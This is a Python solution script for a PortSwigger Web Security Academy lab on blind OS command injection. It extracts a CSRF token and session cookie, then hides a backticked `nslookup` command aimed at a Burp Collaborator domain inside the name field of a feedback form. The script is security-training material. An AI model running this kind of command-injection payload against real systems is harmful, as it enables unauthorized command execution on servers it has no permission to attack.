###################################################################################
#
# Author: Ahmed Elqalaawy (@elqal3awii)
#
# Date: 10/10/2023
#
# Lab: Blind OS command injection with out-of-band interaction
#
# Steps: 1. Fetch the feedback page
#        2. Extract the csrf token and session cookie
#        3. Inject payload into the name field when submitting a feedback to
#           issue a DNS lookup to burp collaborator.
#        4. Check your burp collaborator for the DNS lookup
#
###################################################################################


###########
# imports
###########
import requests
from colorama import Fore
import re


#########
# Main
#########

# change this to your lab URL
url = "https://0a56000903c293e981aa0c8500d00065.web-security-academy.net" 

# change this to your collaborator domain
collaborator = "ftcwc7fnscuhbzeiog8dw400crii68ux.oastify.com"

print(Fore.BLUE + "⟪#⟫ Injection point: " + Fore.YELLOW + "name")

try:
    # fetch the feedback page
    injection = requests.get(f"{url}/feedback")
    
except:
    print(Fore.RED + "[!] Failed to fetch the feedback page through exception")
    exit(1)

print(Fore.WHITE + "⦗1⦘ Fetching the feedback page.. " + Fore.GREEN + "OK")

# get session cookie
session = injection.cookies.get("session")

# extract the csrf token
csrf = re.findall("csrf.+value=\"(.+)\"", injection.text)[0]

print(Fore.WHITE + "⦗2⦘ Extracting the csrf token and session cookie.. " + Fore.GREEN + "OK")

# the payload to issue a DNS lookup to burp collaborator
payload = f"`nslookup {collaborator}`"

# set session cookie
cookies ={
    "session": session
}

# data to send via POST
data = {
    "csrf": csrf,
    "name": payload,
    "email": "no@hack.com",
    "subject": "hacking",
    "message": "you are hacked",
}

try:
    # fetch the page with the injected payload
    injection = requests.post(f"{url}/feedback/submit", data, cookies=cookies)
    
except:
    print(Fore.RED + "[!] Failed to fetch the page with the injected payload through exception")
    exit(1)

print(Fore.WHITE + "⦗3⦘ Injecting payload to issue a DNS lookup to burp collaborator.. " +  Fore.GREEN + "OK")
print(Fore.WHITE + "🗹 Check your burp collaborator for the DNS lookup")
print(Fore.WHITE + "🗹 Check your browser, it should be marked now as " + Fore.GREEN + "solved")



